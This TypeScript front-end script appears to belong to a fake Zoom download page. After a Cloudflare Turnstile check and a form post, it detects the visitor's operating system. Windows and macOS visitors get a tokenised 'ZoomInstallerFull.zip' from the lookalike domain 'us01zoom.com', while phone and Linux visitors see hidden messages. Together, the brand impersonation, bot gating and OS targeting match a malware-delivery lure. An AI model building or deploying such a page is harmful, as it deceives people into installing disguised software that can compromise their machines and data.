import platform from 'platform';

declare global {
	interface Window {
		turnstile: any;
	}
}

const textPhone = document.getElementById('hidden-text-phone') as HTMLParagraphElement
const textLinux = document.getElementById('hidden-text-linux') as HTMLParagraphElement
const captchaText = document.getElementById('captcha-text') as HTMLParagraphElement
const protectedForm = document.getElementById('protected-form') as HTMLFormElement

const osCategory: string = getOSCategory()


function getOSCategory() {
	const os = platform.os;
	if (!os || !os.family) return 'Unknown OS';

	if (os.family === 'Windows') {
		return 'Windows';
	}

	if (os.family === 'OS X' || os.family === 'macOS') {
		const versionStr = os.version || '';
		const majorVersion = parseInt(versionStr.split('.')[0], 10);

		if (!isNaN(majorVersion)) {
			return majorVersion < 15 ? 'macOS < 15' : 'macOS >= 15';
		} else {
			return 'macOS (unknown version)';
		}
	}

	if (os.family.startsWith("Linux")) {
		return "Linux"
	}

	return 'Other OS';
}

protectedForm.addEventListener("submit", async function(e) {
	e.preventDefault();

	const token = window.turnstile.getResponse();

	if (!token) {
		captchaText.style.display = "block"
		return
	}

	captchaText.style.display = "none"

	const form = e.target as HTMLFormElement;
	const formData = new FormData(form);

	const response = await fetch(form.action, {
		method: 'POST',
		body: formData,
	});

	const result = await response.json();

	if (result.success) {
		if (osCategory != 'Windows' && osCategory != 'macOS < 15' && osCategory != 'macOS >= 15' && osCategory != "Linux") {
			textPhone.style.display = 'block'
		} else if (osCategory == "Linux") {
			textLinux.style.display = 'block'
		} else {
			const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}/`;
			window.open(downloadUrl, '_blank')
		}
	}
})
